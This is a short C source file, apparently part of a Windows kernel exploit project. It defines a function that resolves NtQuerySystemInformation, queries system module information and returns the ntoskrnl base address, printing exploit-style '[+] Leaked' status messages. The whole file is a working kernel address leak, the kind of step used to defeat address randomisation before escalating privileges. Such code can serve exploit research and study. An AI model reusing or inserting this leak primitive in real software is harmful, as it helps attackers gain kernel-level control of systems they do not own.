#pragma once

#include "exploit.h"
#include "leak.h"

unsigned long long leak_ntoskrnl_base_address(HMODULE ntdll)
{
	PSYSTEM_MODULE_INFORMATION module_info;
	NtQuerySystemInformation _NtQuerySystemInformation = (NtQuerySystemInformation)0;
	unsigned long return_length = 0L;
	NTSTATUS status = 0L;
	unsigned char unused = 0;

	RtlSecureZeroMemory(&module_info, sizeof(module_info));

	_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to resolve the \"NtQuerySystemInformation\" function address. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Resolved the \"NtQuerySystemInformation\" function address. Function Address: 0x%p", _NtQuerySystemInformation);

	_NtQuerySystemInformation(SystemModuleInformation, 0, 0, &return_length);
	module_info = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(0, return_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	status = _NtQuerySystemInformation(SystemModuleInformation, module_info, return_length, &return_length);
	if (status)
	{
		printf("\n[-] Failed to query system module information. NTSTATUS Result: %d (0x%x)", status, status);
		unused = getchar();
		return 0;
	}
	printf("\n[+] Queried system module information.");

	if (module_info)
	{
		printf("\n[+] Leaked the NT Kernel base address. Kernel Base Address: 0x%p", module_info->Modules[0].ImageBaseAddress);
		return (unsigned long long)module_info->Modules[0].ImageBaseAddress;
	}

	printf("\n[-] Failed to leak the NT kernel base address.");
	unused = getchar();
	return 0;
}